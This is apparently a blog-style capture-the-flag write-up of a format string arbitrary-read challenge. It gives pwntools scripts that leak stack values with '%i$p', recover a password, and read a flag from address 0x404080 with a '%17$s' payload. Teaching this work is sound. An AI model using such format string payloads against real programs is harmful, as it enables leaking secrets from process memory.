---
title: "Format String - Read"
date: 2019-06-19
description: "format string vulnerability 1"
tags: ["Binary Exploitation Series"]
type: post
weight: 20
showTableOfContents: true
---

# Arbitrary Read 

---

# ⚖️ Challenge Write-up

# General Analysis
    
![Untitled.png](https://hackmd.io/_uploads/ry-Y1nIm6.png)
    

---

- Checking for Format String Vulnerability
    
![Untitled 1.png](https://hackmd.io/_uploads/ry6OynU76.png)
    

# Starting Exploit to find the address leak
    
```python
#!/usr/bin/python3
    
from pwn import *
    
context.log_level = 'error'
for i in range(1,50):
  io = process('./fmt_read')
  payload = f'%{i}$p'
  io.sendline(payload)
  print(io.recvall())
  io.close()
```
    
using the above we will be able to get address leaks from stack
    
# Pulling out the password from the leak

```markdown
Enter Password - Pa$$w0rd_1s_0n_Th3_St4ck
What you are looking for is here - 0x404080
Enter String - %p.%p
0xa.(nil)
```

- So the following is still vulnerable to format string, and we also get an address

- Second Exploit

```python
#!/usr/bin/python3

from pwn import *

context.log_level = 'error'

for i in range(1,50):
    io = process('./fmt_read')
    io.sendline('Pa$$w0rd_1s_0n_Th3_St4ck')
    payload = f'AAAAAAAA.%{i}$p'
    #payload = f'%{i}$p'
    io.sendline(payload)
    print(io.recvall(),i)
    io.close()
```

```markdown
b'Enter Password - What you are looking for is here - 0x404080\nEnter String - AAAAAAAA.0x4141414141414141' 16
```

# Final Exploit

```python
#!/usr/bin/python3

from pwn import *

context.log_level = 'error'

io = process('./fmt_read')
io.sendline('Pa$$w0rd_1s_0n_Th3_St4ck')
payload = b'%17$sAAA' + p64(0x404080)
io.sendline(payload)
print(io.recvall())
io.close()
```

# Explanation

```markdown
After we have found where flag's address value is stored, we read the value in the form of string 
from the address using the given exploit.
```

# Output

```markdown
b'Enter Password - What you are looking for is here - 0x404080\nEnter String - FLAG{F0rm4t_Str1ngs_4re_C00l}AAA\x80@@'
```